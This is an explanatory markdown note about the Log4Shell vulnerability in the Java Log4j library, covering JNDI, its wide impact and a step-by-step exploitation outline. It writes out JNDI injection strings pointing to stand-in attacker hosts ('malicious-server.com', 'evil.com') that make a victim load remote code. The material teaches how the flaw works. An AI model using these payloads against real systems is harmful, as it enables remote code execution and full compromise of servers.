# What is Log4j?
- Log4j is a logging library for java applications.

- Every serious java applications uses some form of logging.
- Log4j was one of the most popular choices for years.

## What went wrong? (Log4shell)
- In the late 2021, a critical vulnerability was found in log4j.
- It was named
  
  > Log4Shell (CVE-2021-44228) 

- It allowed **Remote Code Execution** - the most dangerous kind of vulnerability.
- Imagine an application writing down a log message like:
```bash
User: ${jndi:ldap://malicious-server.com/payload}
```
Log4j wouldn't treat this as text. It would interpret it and actually make a network request to the attackers server and executes whatever code it recieved.

## What is JNDI?
- JNDI stands for **Java Naming & Directory Interface**.
- A system to fetch:

  - Data
  - Objects
  - Configurations

- From remote directories like:

  - LPAD
  - RMI
  - DNS

- JNDI itself isn't evil - but log4j trusted userinput too much.
  
## Why it was so dangerous?

1. Log4j was everywhere.

   - Minecraft servers
   - Enterprise servers
   - Cloud systems
   - IoT devices
   - Banking apps
   - Government apps
   - Amazon, Apple, Tesla etc...

2. The exploit almost required no skill:  
   Just send a string containing **${jndi:ldap://...}**.

3. The impact was full remotecode execution.
4. Attackers were mass scanning the internet within hours of disclosure.

## Exploitation steps.

1. **Victim application logs a user-controlled value**

   (eg: Username, HTTP Header, Chat message)

2. **Attacker sends:**
   ```bash
   ${jndi:ldap://evil.com/a}
   ```
3. **Log4j interprets it**  
   reaches out to attacker server through JNDI

4. **Attacker responds with malicious class**
   - Java loads and executes it
   - Full compromise
